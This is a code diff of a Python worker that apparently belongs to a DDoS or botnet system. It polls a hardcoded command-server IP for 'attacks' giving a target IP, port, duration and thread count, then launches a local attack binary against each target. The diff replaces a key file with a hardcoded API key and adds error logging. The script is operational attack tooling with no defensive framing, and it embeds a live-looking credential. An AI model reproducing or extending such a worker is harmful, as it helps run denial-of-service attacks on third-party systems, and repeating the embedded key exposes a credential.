@@ -5,23 +5,17 @@ import json
 import os
 
 BASE_URL = 'http://3.228.19.162:80'
-API_KEY_FILE = 'api_key.txt'
+
+# DIRECT API KEY HERE
+API_KEY = "vishal_4890f887cf75bb003d959b68e8dd2f5b"  # यहाँ अपना API key डालें
 
 # Track active attacks
 active_tasks = {}
 
-def load_api_key():
-    """Load API key from file"""
-    try:
-        with open(API_KEY_FILE, 'r') as f:
-            return f.read().strip()
-    except:
-        return None
-
-def fetch_running_attacks(api_key):
+def fetch_running_attacks():
     """Fetch only RUNNING attacks from server"""
     try:
-        headers = {'X-API-Key': api_key}
+        headers = {'X-API-Key': API_KEY}
         response = requests.get(f'{BASE_URL}/status', headers=headers, timeout=5)
         
         if response.status_code == 200:
@@ -33,8 +27,10 @@ def fetch_running_attacks(api_key):
                     attacks.append(attack)
             
             return attacks
-    except:
-        return []
+        else:
+            print(f"[!] Server error: {response.status_code}")
+    except Exception as e:
+        print(f"[!] Connection error: {e}")
     
     return []
 
@@ -45,7 +41,6 @@ def process_attack(attack_info):
     
     # ONLY process RUNNING attacks
     if status != 'running':
-        print(f"[!] Skipping {attack_id} (status: {status})")
         return
     
     # Skip if already processing
@@ -63,6 +58,7 @@ def process_attack(attack_info):
     print(f"[+] Running attack: {ip}:{port} ({duration}s, {threads} threads)")
     
     if not os.path.exists('./vishal'):
+        print("[!] vishal binary not found!")
         return
     
     try:
@@ -77,8 +73,8 @@ def process_attack(attack_info):
         }
         
         print(f"[+] Started PID: {process.pid}")
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Failed to start: {e}")
 
 def clean_completed_tasks():
     """Remove completed tasks"""
@@ -106,19 +102,13 @@ def clean_completed_tasks():
 
 def main():
     """Main loop"""
-    print("[+] Worker started")
-    
-    api_key = load_api_key()
-    if not api_key:
-        print("[!] No API key found in api_key.txt")
-        return
-    
-    print(f"[+] API key loaded")
+    print(f"[+] Worker started for {BASE_URL}")
+    print(f"[+] Using API key: {API_KEY[:10]}...")
     
     while True:
         try:
             # Get RUNNING attacks only
-            attacks = fetch_running_attacks(api_key)
+            attacks = fetch_running_attacks()
             
             if attacks:
                 print(f"[+] Found {len(attacks)} running attacks")
@@ -139,7 +129,8 @@ def main():
         except KeyboardInterrupt:
             print("\n[!] Stopping...")
             break
-        except:
+        except Exception as e:
+            print(f"[!] Error: {e}")
             time.sleep(5)
 
 if __name__ == '__main__':
